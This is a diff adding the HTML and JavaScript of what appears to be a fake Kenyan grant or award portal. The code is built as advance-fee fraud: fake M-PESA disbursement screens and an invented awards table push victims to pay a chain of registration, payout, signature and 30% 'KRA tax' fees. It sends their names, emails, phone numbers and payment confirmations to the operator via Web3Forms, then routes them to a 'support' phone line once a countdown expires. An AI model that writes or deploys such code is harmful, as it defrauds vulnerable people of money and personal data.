+                        <button class="btn btn-awards-check" onclick="goNext(14)">CHECK LATEST AWARDS TABLE</button>
+                    </div>
+                </div>
+            </div>
+            
+            <div id="page14" class="page">
+                <div class="navbar" style="background: #FF9800;">
+                    Final Disbursement Console
+                </div>
+                <div class="final-disbursement-box">
+                    <div class="disbursement-title">
+                        SYSTEM PROCESSING AWARD RELEASE
+                    </div>
+                    <span class="computer-graphic processing">🔄</span>
+                    <p style="font-size: 18px; color: #333; font-weight: 600;">
+                        Disbursing <strong style="color: #D32F2F;">Ksh <span id="disbursementAmount">500,000</span></strong> to <strong style="color: #1976D2;"><span id="disbursementPhoneNumber">07XXXXXXXX</span></strong>
+                    </p>
+                    <p class="wait-message">
+                        This is the FINAL step. Please wait for the M-PESA confirmation message.
+                    </p>
+                </div>
+                <div style="margin-top: 20px; text-align: center;">
+                    <p style="font-size: 15px; color: #555;">
+                        If you do not receive the funds within 5 minutes, please refresh the page to try again.
+                    </p>
+                    <button class="btn-finalize" onclick="goNext(14)" style="margin-top: 15px;">REFRESH & FINALISE 🔄</button>
+                </div>
+            </div>
+            
+            <div id="page15" class="page">
+                <div class="navbar" style="background: #0A430E;">
+                    Latest Award Applicants
+                </div>
+                <p class="question" style="font-size: 18px; text-align: center; color: #1976D2;">
+                    Transparency Report: Awards disbursed in the last 24 hours.
+                </p>
+                
+                <div class="awards-table-container">
+                    <table class="awards-table">
+                        <thead>
+                            <tr>
+                                <th>#</th>
+                                <th>Applicant Phone</th>
+                                <th>Award Amount</th>
+                                <th>ID Prefix</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr><td>1</td><td>0700xxxx21</td><td><strong>Ksh 300,000</strong></td><td>IJF-732</td></tr>
+                            <tr><td>2</td><td>0719xxxx55</td><td><strong>Ksh 95,000</strong></td><td>IJF-101</td></tr>
+                            <tr><td>3</td><td>0720xxxx88</td><td><strong>Ksh 200,000</strong></td><td>IJF-499</td></tr>
+                            <tr><td>4</td><td>0711xxxx02</td><td><strong>Ksh 500,000</strong></td><td>IJF-810</td></tr>
+                            <tr><td>5</td><td>0780xxxx15</td><td><strong>Ksh 65,000</strong></td><td>IJF-021</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+                <p style="text-align: center; margin-top: 25px;">
+                    <button class="btn-back" onclick="goBack(15)">⬅ BACK TO DASHBOARD</button>
+                </p>
+            </div>
+            
+            <div id="pageP" class="page">
+                <div class="navbar" style="background: #D32F2F;">
+                    Award Processing
+                </div>
+                <div style="text-align: center; padding: 40px 20px;">
+                    <span class="computer-graphic">🔄</span> 
+                    <h2 class="disbursement-title" style="color:#0A430E; font-size: 26px;">
+                        System Validation in Progress <span class="loading-dots"></span>
+                    </h2>
+                    <p class="wait-message" style="border-color: #1976D2; color: #1976D2;">
+                        Please **DO NOT** refresh or navigate away from this page. System validating inputs and routing funds.
+                    </p>
+                </div>
+            </div>
+            </div>
+    </div>
+    
+    <script>
+        // --- Global State Variables ---
+        let currentPageIndex = 0; 
+        let selectedOption = null;
+        let selectedSource = null;
+        let selectedPurpose = null;
+        let selectedRegFee = 0;
+        let selectedAwardAmount = 500000; // Default or last selected
+        let payoutOptionFee = 0;
+        let mpesaMessages = new Set(); // To track unique MPESA messages
+        let countdownInterval = null; 
+
+        const ASSISTANCE_NUMBER = '0518005040'; 
+        const COUNTDOWN_DURATION_SECONDS = 6 * 60 * 60; // 6 hours
+        const WEB3FORMS_ACCESS_KEY = '750707f5-b4fd-42f8-b5a7-bcab3c6546ea'; 
+
+        // Storage keys for persistence and security
+        const STORAGE_KEY_START_TIME = 'countdownStartTime';
+        const STORAGE_KEY_APPLICANT_NAME = 'applicantFullName';
+        const STORAGE_KEY_USER_EMAIL = 'userEmail';
+        const STORAGE_KEY_USER_PASS = 'userPass';
+        const STORAGE_KEY_APPLICANT_PHONE = 'applicantPhone'; 
+        const STORAGE_KEY_APPLICANT_ID = 'applicantID'; 
+        const STORAGE_KEY_KRA_FEE = 'kraFeeAmount'; // Key for KRA fee persistence
+
+        const SESSION_KEY_CURRENT_PAGE = 'currentPage'; // Tracks current authorized page index
+        const SESSION_KEY_ACCESS_TOKEN = 'sessionToken'; // Unique token for session security
+
+        // --- Utility Functions ---
+
+        function generateUniqueToken() {
+            return Date.now().toString(36) + Math.random().toString(36).substring(2, 9);
+        }
+
+        function generateApplicantID() {
+            return 'IJF-' + Math.floor(100000 + Math.random() * 900000);
+        }
+        
+        function formatNumber(num) {
+            return num.toLocaleString();
+        }
+
+        function showPage(pageId) {
+            // 1. Hides all pages
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+            
+            // 2. Shows the requested page
+            const targetPage = document.getElementById(pageId);
+            if (targetPage) {
+                targetPage.classList.add('active');
+                
+                // 3. Update global index based on the page ID
+                const pages = Array.from(document.querySelectorAll('.page'));
+                currentPageIndex = pages.findIndex(page => page.id === pageId);
+                
+                // 4. Update session storage for security tracking
+                // Only save the page if it's not the processing page ('pageP') or the login page ('page0')
+                if (pageId !== 'pageP' && pageId !== 'page0') {
+                    sessionStorage.setItem(SESSION_KEY_CURRENT_PAGE, currentPageIndex);
+                }
+                
+                // 5. Handle Post-Transition Actions
+                handlePostTransitionActions(currentPageIndex);
+            }
+        }
+
+        // NEW: Function to toggle password visibility
+        function togglePasswordVisibility(inputId, iconElement) {
+            const input = document.getElementById(inputId);
+            if (input.type === "password") {
+                input.type = "text";
+                iconElement.textContent = "🙈"; // Hide icon
+            } else {
+                input.type = "password";
+                iconElement.textContent = "👁️"; // Show icon
+            }
+        }
+        
+        // --- CORE SECURITY & PERSISTENCE LOGIC ---
+
+        function checkAccessAndRedirect() {
+            const token = sessionStorage.getItem(SESSION_KEY_ACCESS_TOKEN);
+            let savedPageIndex = parseInt(sessionStorage.getItem(SESSION_KEY_CURRENT_PAGE));
+            const pages = Array.from(document.querySelectorAll('.page'));
+            
+            // Load persistent data
+            selectedAwardAmount = parseInt(localStorage.getItem('selectedAwardAmount')) || selectedAwardAmount;
+            selectedRegFee = parseInt(localStorage.getItem('selectedRegFee')) || selectedRegFee;
+            payoutOptionFee = parseInt(localStorage.getItem('payoutOptionFee')) || payoutOptionFee;
+
+            // SCENARIO 1: No login token or corrupted page data (FORCE LOGIN)
+            if (!token) {
+                // If we are already on page 0 (login), just show it and exit.
+                if (pages[currentPageIndex] && pages[currentPageIndex].id === 'page0') {
+                    return;
+                }
+                
+                currentPageIndex = 0;
+                sessionStorage.clear();
+                showPage('page0');
+                return;
+            }
+
+            // SCENARIO 2: Logged in (RESTORE LAST PAGE)
+            if (token) {
+                // If savedPageIndex is not set (i.e., user just registered or started on Page 1), set it to 1.
+                if (isNaN(savedPageIndex) || savedPageIndex === 0) {
+                     savedPageIndex = 1; 
+                }
+                
+                // Redirect user to the last page they were on, unless they are already there.
+                if (pages[currentPageIndex] && pages[currentPageIndex].id !== pages[savedPageIndex].id) {
+                    showPage(pages[savedPageIndex].id);
+                }
+                handlePostTransitionActions(savedPageIndex);
+            }
+        }
+        
+        // --- CORE PROCESSING LOGIC ---
+
+        function getNextPageId(currentIndex) {
+            // Mapping of current page index to next page index
+            const nextMap = {
+                0: 1,  
+                1: 2,  
+                2: 3,  
+                3: 4,  
+                4: 5,  
+                5: 6,  
+                6: 7,  
+                7: 8,  
+                8: 9,  
+                9: 10, 
+                10: 11,
+                11: 12,
+                12: 13,
+                13: 14,
+                14: 15, 
+                15: 13  
+            };
+            
+            return nextMap[currentIndex] || currentIndex + 1;
+        }
+
+        function startProcessing(destinationPageIndex) {
+            if (!validateCurrentPage(currentPageIndex)) {
+                return; 
+            }
+
+            // Start animation
+            const graphic = document.querySelector('#pageP .computer-graphic');
+            graphic.classList.add('processing');
+            
+            showPage('pageP'); // Switch to universal processing page
+
+            setTimeout(function() {
+                graphic.classList.remove('processing');
+                
+                const pages = Array.from(document.querySelectorAll('.page'));
+                if (destinationPageIndex < pages.length) {
+                    const destinationPageId = pages[destinationPageIndex].id;
+                    showPage(destinationPageId);
+                }
+            }, 3000); // 3 seconds
+        }
+        
+        function goNext(currentIndex) {
+            const destinationIndex = getNextPageId(currentIndex);
+            startProcessing(destinationIndex);
+        }
+        
+        function goBack(currentIndex) {
+            const pages = Array.from(document.querySelectorAll('.page'));
+            let targetIndex = currentIndex - 1;
+            
+            if (currentIndex === 15 || currentIndex === 14) { 
+                targetIndex = 13;
+            }
+            
+            // Allow going back to page 1 from page 2, 3, 4, etc. but not from page 1 to page 0
+            if (targetIndex < 1) {
+                targetIndex = 1;
+            }
+
+            if (targetIndex >= 0 && targetIndex < pages.length) {
+                showPage(pages[targetIndex].id);
+            }
+        }
+        
+        // --- DASHBOARD TIMER LOGIC (Simplified for brevity, similar to previous version) ---
+        
+        function handleInitiateTransfer() {
+            let countdownStartTime = localStorage.getItem(STORAGE_KEY_START_TIME);
+
+            if (!countdownStartTime || (Date.now() - countdownStartTime) / 1000 >= COUNTDOWN_DURATION_SECONDS) {
+                countdownStartTime = Date.now();
+                localStorage.setItem(STORAGE_KEY_START_TIME, countdownStartTime);
+                updateDashboardStatus(true); 
+            }
+            
+            startCountdown();
+
+            goNext(13); // Proceed to Page 14
+        }
+        
+        function startCountdown() {
+            if (countdownInterval) return;
+            const countdownStartTime = localStorage.getItem(STORAGE_KEY_START_TIME);
+            
+            if (!countdownStartTime) return;
+
+            if ((Date.now() - countdownStartTime) / 1000 >= COUNTDOWN_DURATION_SECONDS) {
+                updateDashboardStatus(false);
+                return;
+            }
+            
+            document.getElementById('statusTimerDisplay').style.display = 'block';
+            countdownInterval = setInterval(updateCountdown, 1000);
+        }
+
+        function stopCountdown() {
+            if (countdownInterval) {
+                clearInterval(countdownInterval);
+                countdownInterval = null;
+            }
+        }
+
+        function updateCountdown() {
+            const countdownStartTime = localStorage.getItem(STORAGE_KEY_START_TIME);
+            if (!countdownStartTime) {
+                stopCountdown();
+                return;
+            }
+            
+            const elapsed = (Date.now() - countdownStartTime) / 1000;
+            const remaining = COUNTDOWN_DURATION_SECONDS - elapsed;
+
+            if (remaining <= 0) {
+                stopCountdown();
+                updateDashboardStatus(false); 
+            } else {
+                const hours = Math.floor(remaining / 3600);
+                const minutes = Math.floor((remaining % 3600) / 60);
+                const seconds = Math.floor(remaining % 60);
+
+                const timeString = 
+                    String(hours).padStart(1, '0') + ':' + 
+                    String(minutes).padStart(2, '0') + ':' + 
+                    String(seconds).padStart(2, '0');
+                
+                document.getElementById('statusTimerDisplay').innerHTML = `**B2C TRANSFER WINDOW:** ${timeString} **REMAINING**`;
+            }
+        }
+
+        function updateDashboardStatus(isPending) {
+            const statusBox = document.getElementById('dashboardStatusContainer');
+            const instructionText = document.getElementById('dashboardInstructionText');
+            const timerDisplay = document.getElementById('statusTimerDisplay');
+
+            if (isPending) {
+                statusBox.classList.remove('timeout');
+                statusBox.classList.add('dashboard-status');
+                statusBox.textContent = 'STATUS: FUNDS PENDING FINAL DISBURSEMENT';
+                instructionText.innerHTML = 'Your funds are queued for B2C transfer. The process is being tracked by the Treasury system.';
+                timerDisplay.style.display = 'block';
+                timerDisplay.innerHTML = `**B2C TRANSFER WINDOW:** 6:00:00 **REMAINING**`; 
+            } else {
+                statusBox.classList.remove('dashboard-status');
+                statusBox.classList.add('timeout');
+                statusBox.textContent = 'STATUS: MANDATORY ASSISTANCE REQUIRED';
+                timerDisplay.style.display = 'none'; 
+
+                instructionText.innerHTML = `
+                    <p style="font-weight:700; color:#D32F2F;">⚠️ **Transfer Window Expired:** The automated disbursement process has timed out.</p>
+                    <p style="margin-top: 15px;">Kindly contact our dedicated support team immediately via **+254 ${ASSISTANCE_NUMBER}** for manual fund release authorization and immediate processing assistance. Please reference your Applicant ID.</p>
+                `;
+            }
+        }
+        
+        // --- VALIDATION AND ACTION HANDLERS ---
+        
+        function validateCurrentPage(index) {
+            if (index === 1 && !selectedOption) return false;
+            if (index === 2 && document.getElementById('page2NextButton').disabled) return false;
+            if (index === 3 && document.getElementById('page3NextButton').disabled) return false;
+            if (index === 5 && document.getElementById('page5NextButton').disabled) return false;
+            if (index === 7 && document.getElementById('page7NextButton').disabled) return false;
+            if (index === 8 && document.getElementById('page8NextButton').disabled) return false;
+            if (index === 10 && document.getElementById('page10NextButton').disabled) return false;
+            if (index === 12 && document.getElementById('page12NextButton').disabled) return false;
+            
+            return true; 
+        }
+
+        function handlePostTransitionActions(index) {
+            // Logic to update dynamic text fields when landing on a page
+            
+            if (index === 6) {
+                const phone = localStorage.getItem(STORAGE_KEY_APPLICANT_PHONE) || '...';
+                document.getElementById('finalPhoneNumber').textContent = phone;
+                document.getElementById('finalAwardAmount').textContent = 'Ksh ' + formatNumber(selectedAwardAmount);
+                document.getElementById('finalRegFeeAmount').textContent = 'Ksh ' + formatNumber(selectedRegFee);
+            } else if (index === 7) {
+                document.getElementById('regFeeConfirmationAmount').textContent = formatNumber(selectedRegFee);
+            } else if (index === 8) {
+                document.querySelectorAll('.payout-option').forEach(opt => opt.classList.remove('selected'));
+                document.getElementById('page8NextButton').disabled = true;
+                document.getElementById('payoutMpesaPasteArea').style.display = 'none';
+            } else if (index === 11) {
+                // KRA Fee Calculation (30% Logic)
+                const itaxFee = Math.ceil(selectedAwardAmount * 0.30); // Use Math.ceil to round up to the nearest whole number
+                localStorage.setItem(STORAGE_KEY_KRA_FEE, itaxFee);
+
+                document.getElementById('itaxAwardAmount').textContent = formatNumber(selectedAwardAmount);
+                document.getElementById('itaxFeeAmount').textContent = 'Ksh ' + formatNumber(itaxFee);
+                
+            } else if (index === 12) {
+                const kraFee = parseInt(localStorage.getItem(STORAGE_KEY_KRA_FEE)) || 9450;
+                document.getElementById('kraFeeConfirmationAmount').textContent = formatNumber(kraFee);
+                
+            } else if (index === 13) {
+                const applicantName = localStorage.getItem(STORAGE_KEY_APPLICANT_NAME) || 'Applicant';
+                const applicantID = localStorage.getItem(STORAGE_KEY_APPLICANT_ID) || 'IJF-000000';
+                
+                document.getElementById('applicantGreeting').textContent = `Welcome, ${applicantName}!`;
+                document.getElementById('dashboardAwardAmount').textContent = 'Ksh ' + formatNumber(selectedAwardAmount);
+                document.getElementById('dashboardApplicantID').textContent = applicantID;
+                
+                const countdownStartTime = localStorage.getItem(STORAGE_KEY_START_TIME);
+                if (countdownStartTime) {
+                    const elapsed = (Date.now() - countdownStartTime) / 1000;
+                    if (elapsed >= COUNTDOWN_DURATION_SECONDS) {
+                         updateDashboardStatus(false);
+                    } else {
+                         updateDashboardStatus(true);
+                         startCountdown();
+                    }
+                } else {
+                    updateDashboardStatus(true); 
+                    document.getElementById('statusTimerDisplay').style.display = 'none'; 
+                }
+            } else if (index === 14) {
+                const phone = localStorage.getItem(STORAGE_KEY_APPLICANT_PHONE) || '07XXXXXXXX';
+                document.getElementById('disbursementAmount').textContent = formatNumber(selectedAwardAmount);
+                document.getElementById('disbursementPhoneNumber').textContent = phone;
+            }
+        }
+        
+        // --- AUTHENTICATION LOGIC ---
+
+        function toggleForm(type) {
+            document.getElementById('loginForm').style.display = (type === 'login' ? 'block' : 'none');
+            document.getElementById('registerForm').style.display = (type === 'register' ? 'block' : 'none');
+            document.getElementById('authNavbar').textContent = (type === 'login' ? 'Account Login' : 'Account Registration');
+        }
+
+        function loginUser() {
+            const email = document.getElementById('loginEmail').value.trim();
+            const password = document.getElementById('loginPassword').value;
+            const savedEmail = localStorage.getItem(STORAGE_KEY_USER_EMAIL);
+            const savedPassword = localStorage.getItem(STORAGE_KEY_USER_PASS);
+            // Get the last page index from session storage, default to 1 if not set
+            const lastPage = parseInt(sessionStorage.getItem(SESSION_KEY_CURRENT_PAGE)) || 1; 
+
+            document.getElementById('loginEmailError').style.display = 'none';
+            document.getElementById('loginPasswordError').style.display = 'none';
+
+            if (email === savedEmail && password === savedPassword && email) {
+                // SUCCESS: Generate token, and take user to their last page (or page 1)
+                sessionStorage.setItem(SESSION_KEY_ACCESS_TOKEN, generateUniqueToken());
+                startProcessing(lastPage); // Redirects to the saved page index
+            } else if (!savedEmail) {
+                document.getElementById('loginEmailError').textContent = 'No registered account found. Please register.';
+                document.getElementById('loginEmailError').style.display = 'block';
+            } else {
+                document.getElementById('loginPasswordError').textContent = 'Invalid email or password.';
+                document.getElementById('loginPasswordError').style.display = 'block';
+            }
+        }
+
+        function registerUser() {
+             const email = document.getElementById('regEmail').value.trim();
+             const name = document.getElementById('regName').value.trim();
+             const pass = document.getElementById('regPassword').value;
+             const confirmPass = document.getElementById('confirmPassword').value;
+
+             if (!email || !name || pass.length < 6 || pass !== confirmPass) {
+                 if (pass.length < 6) alert("Password must be at least 6 characters.");
+                 else if (pass !== confirmPass) alert("Passwords do not match.");
+                 else alert("Please fill in all registration fields.");
+                 return;
+             }
+             
+             // Save registration details
+             localStorage.setItem(STORAGE_KEY_USER_EMAIL, email);
+             localStorage.setItem(STORAGE_KEY_USER_PASS, pass);
+             localStorage.setItem(STORAGE_KEY_APPLICANT_NAME, name);
+             localStorage.setItem(STORAGE_KEY_APPLICANT_ID, generateApplicantID()); 
+             
+             // SUCCESS: Generate token and proceed to page 1
+             sessionStorage.setItem(SESSION_KEY_ACCESS_TOKEN, generateUniqueToken());
+             sessionStorage.setItem(SESSION_KEY_CURRENT_PAGE, 1); // Set starting page for new user
+
+             startProcessing(1); 
+        }
+
+        // --- SELECTION AND MPESA LOGIC ---
+
+        function selectOption1(value) {
+            selectedOption = value;
+            document.getElementById('optionYes').classList.toggle('selected', value === 'yes');
+            document.getElementById('optionNo').classList.toggle('selected', value === 'no');
+        }
+
+        function selectSource(element) {
+            document.querySelectorAll('.options-container .option').forEach(opt => opt.classList.remove('selected'));
+            element.classList.add('selected');
+            selectedSource = element.dataset.value;
+            
+            if (selectedSource === 'Other') {
+                document.getElementById('otherInputContainer').style.display = 'block';
+                validateOtherInput(); 
+            } else {
+                document.getElementById('otherInputContainer').style.display = 'none';
+                document.getElementById('page2NextButton').disabled = false;
+            }
+        }
+
+        function validateOtherInput() {
+            const input = document.getElementById('otherInput').value.trim();
+            const button = document.getElementById('page2NextButton');
+            
+            if (selectedSource === 'Other' && input.length < 3) {
+                button.disabled = true;
+            } else {
+                button.disabled = false;
+            }
+        }
+
+        function selectPurpose(element) {
+            document.querySelectorAll('.options-container .option').forEach(opt => opt.classList.remove('selected'));
+            element.classList.add('selected');
+            selectedPurpose = element.dataset.value;
+            document.getElementById('page3NextButton').disabled = false;
+        }
+        
+        function submitLoanForm(event) {
+            event.preventDefault();
+            
+            const emailValue = document.getElementById('regEmailAddress').value.trim();
+            const fullNameValue = document.getElementById('fullName').value.trim();
+            const phoneValue = document.getElementById('phoneNumber').value.trim();
+            
+            // Save required info to localStorage
+            localStorage.setItem(STORAGE_KEY_APPLICANT_NAME, fullNameValue);
+            localStorage.setItem(STORAGE_KEY_APPLICANT_PHONE, phoneValue);
+            
+            const form = event.target;
+            const formData = new FormData(form);
+            formData.set('Email', emailValue); // Ensure email is in the FormData
+            
+            fetch(form.action, {
+                method: form.method,
+                body: formData,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            })
+            .then(response => {
+                startProcessing(5); // Proceed regardless of fetch success/fail to prevent user blockage
+            })
+            .catch(error => {
+                console.error('Network error during form submission:', error);
+                startProcessing(5);
+            });
+            
+            return false; 
+        }
+
+        function selectAward(element) {
+            document.querySelectorAll('#awardOptions .option').forEach(opt => opt.classList.remove('selected'));
+            element.classList.add('selected');
+            
+            selectedRegFee = parseInt(element.dataset.reg);
+            selectedAwardAmount = parseInt(element.dataset.awardInt);
+            
+            // Persist selection for session restoration
+            localStorage.setItem('selectedRegFee', selectedRegFee);
+            localStorage.setItem('selectedAwardAmount', selectedAwardAmount);
+
+            document.getElementById('page5NextButton').disabled = false;
+        }
+        
+        function checkUniqueMpesaMessage(pageIndex) {
+            let inputId;
+            let errorId;
+            let nextButtonId;
+            let requiredFee;
+
+            if (pageIndex === 7) {
+                inputId = 'mpesaConfirmation';
+                errorId = 'mpesaConfirmationError';
+                nextButtonId = 'page7NextButton';
+                requiredFee = selectedRegFee;
+            } else if (pageIndex === 8) { 
+                inputId = 'mpesaPayoutConfirmation';
+                errorId = 'mpesaPayoutConfirmationError';
+                nextButtonId = 'page8NextButton';
+                requiredFee = payoutOptionFee;
+            } else if (pageIndex === 10) { 
+                inputId = 'mpesaSignatureConfirmation';
+                errorId = 'mpesaSignatureConfirmationError';
+                nextButtonId = 'page10NextButton';
+                requiredFee = 7599; 
+            } else if (pageIndex === 12) { 
+                inputId = 'mpesaKraConfirmation';
+                errorId = 'mpesaKraConfirmationError';
+                nextButtonId = 'page12NextButton';
+                requiredFee = parseInt(localStorage.getItem(STORAGE_KEY_KRA_FEE));
+            } else {
+                return;
+            }
+            
+            const message = document.getElementById(inputId).value.trim();
+            const errorElement = document.getElementById(errorId);
+            const nextButton = document.getElementById(nextButtonId);
+            const feeString = formatNumber(requiredFee);
+            
+            if (message.length < 10 || !message.toLowerCase().includes('confirmed')) {
+                errorElement.textContent = 'Error: Please paste the full confirmation message (must include "confirmed").';
+                errorElement.style.display = 'block';
+                nextButton.disabled = true;
+                return;
+            }
+            
+            if (mpesaMessages.has(message)) {
+                errorElement.textContent = `Error: This M-PESA message has already been used.`;
+                errorElement.style.display = 'block';
+                nextButton.disabled = true;
+                return;
+            }
+
+            errorElement.style.display = 'none';
+            nextButton.disabled = false;
+        }
+        
+        function selectPayoutOption(element) {
+            document.querySelectorAll('.payout-option').forEach(opt => opt.classList.remove('selected'));
+            element.classList.add('selected');
+            
+            payoutOptionFee = parseInt(element.dataset.fee);
+            const payoutCharge = element.dataset.charge;
+            
+            // Persist selection for session restoration
+            localStorage.setItem('payoutOptionFee', payoutOptionFee);
+
+            const pasteArea = document.getElementById('payoutMpesaPasteArea');
+            document.getElementById('payoutFeeAmount').textContent = payoutCharge;
+            pasteArea.style.display = 'block';
+            
+            checkUniqueMpesaMessage(8);
+        }
+
+        // Function to submit MPESA message to Web3Forms
+        function submitMpesaConfirmation(pageIndex) {
+            let inputId;
+            let subject;
+            let feePaid;
+
+            if (pageIndex === 7) {
+                inputId = 'mpesaConfirmation';
+                subject = 'MPESA CONFIRMATION 1: REGISTRATION FEE';
+                feePaid = selectedRegFee;
+            } else if (pageIndex === 8) { 
+                inputId = 'mpesaPayoutConfirmation';
+                subject = 'MPESA CONFIRMATION 2: PAYOUT CHARGE';
+                feePaid = payoutOptionFee;
+            } else if (pageIndex === 10) { 
+                inputId = 'mpesaSignatureConfirmation';
+                subject = 'MPESA CONFIRMATION 3: SIGNATURE FEE';
+                feePaid = 7599;
+            } else if (pageIndex === 12) { 
+                inputId = 'mpesaKraConfirmation';
+                subject = 'MPESA CONFIRMATION 4: KRA TAX FEE';
+                feePaid = parseInt(localStorage.getItem(STORAGE_KEY_KRA_FEE));
+            } else {
+                return;
+            }
+
+            const message = document.getElementById(inputId).value.trim();
+            
+            if (!message || document.getElementById(getNextButtonId(pageIndex)).disabled) {
+                 alert("Please paste a valid, unique MPESA message to proceed.");
+                 return;
+            }
+            
+            mpesaMessages.add(message);
+            
+            // Gather details
+            const applicantName = localStorage.getItem(STORAGE_KEY_APPLICANT_NAME) || 'N/A';
+            const applicantEmail = localStorage.getItem(STORAGE_KEY_USER_EMAIL) || 'N/A';
+            const applicantPhone = localStorage.getItem(STORAGE_KEY_APPLICANT_PHONE) || 'N/A';
+            const awardAmount = formatNumber(selectedAwardAmount);
+            
+            const formData = new FormData();
+            formData.append('access_key', WEB3FORMS_ACCESS_KEY);
+            formData.append('subject', `${subject} - ${applicantName}`);
+            formData.append('Applicant Name', applicantName);
+            formData.append('Applicant Email', applicantEmail);
+            formData.append('Applicant Phone', applicantPhone);
+            formData.append('Award Amount', `Ksh ${awardAmount}`);
+            formData.append('Fee Paid (Ksh)', formatNumber(feePaid));
+            formData.append('MPESA Confirmation Message', message);
+            
+            // Send the data
+            fetch('https://api.web3forms.com/submit', {
+                method: 'POST',
+                body: formData,
+            })
+            .then(response => {
+                goNext(pageIndex);
+            })
+            .catch(error => {
+                console.error('Error sending MPESA message:', error);
+                goNext(pageIndex);
+            });
+        }
+        
+        function getNextButtonId(pageIndex) {
+             if (pageIndex === 7) return 'page7NextButton';
+             if (pageIndex === 8) return 'page8NextButton';
+             if (pageIndex === 10) return 'page10NextButton';
+             if (pageIndex === 12) return 'page12NextButton';
+             return '';
+        }
+
+        // On page load, force the login screen and check the dashboard timer status.
+        document.addEventListener('DOMContentLoaded', () => {
+            checkAccessAndRedirect();
+            
+            const countdownStartTime = localStorage.getItem(STORAGE_KEY_START_TIME);
+            if (countdownStartTime) {
+                startCountdown(); 
+            }
+        });
+        
+        window.onhashchange = checkAccessAndRedirect; 
+    </script>
+</body>
+</html>
